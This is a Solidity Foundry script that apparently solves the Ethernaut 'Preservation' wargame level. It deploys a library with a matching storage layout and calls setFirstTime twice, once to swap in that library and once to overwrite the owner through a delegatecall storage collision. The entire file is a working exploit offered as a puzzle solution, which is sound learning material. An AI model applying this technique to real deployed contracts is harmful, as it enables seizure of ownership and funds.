// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";

// Malicious contract to overwrite the owner variable
contract MaliciousLibrary {
    
    // Storage slots must match the Preservation contract
    address public timeZone1Library;  // Slot 0
    address public timeZone2Library;  // Slot 1
    uint256 public owner;             // Slot 2 (this is what we want to overwrite)

    // This function will overwrite the owner variable of the Preservation contract
    function setTime(uint256 _time) public {
        owner = _time;
    }
}

// Script to perform the attack on the Preservation contract
contract PreservationAttackScript is Script {

    // Instance of the Preservation contract (replace with actual contract address)
    Preservation preservationInstance = Preservation(0xYourInstanceAddressHere);

    function run() external {
        // Start broadcasting the transaction using the private key from .env
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the malicious library contract
        MaliciousLibrary maliciousLibrary = new MaliciousLibrary();
        
        //Convert the malicious library's address to uint256
        uint256 maliciousLibraryAddressAsUint = uint256(uint160(address(maliciousLibrary)));
        
        //Call setFirstTime() with the malicious library's address to overwrite timeZone1Library
        preservationInstance.setFirstTime(maliciousLibraryAddressAsUint);

        //Call setFirstTime() again to overwrite the owner variable with the new owner's address
        uint256 attackerAddressAsUint = uint256(uint160(0xYourPlayerAddressHere));  // Replace with attacker's address
        preservationInstance.setFirstTime(attackerAddressAsUint);

        // Stop broadcasting the transaction
        vm.stopBroadcast();
    }
}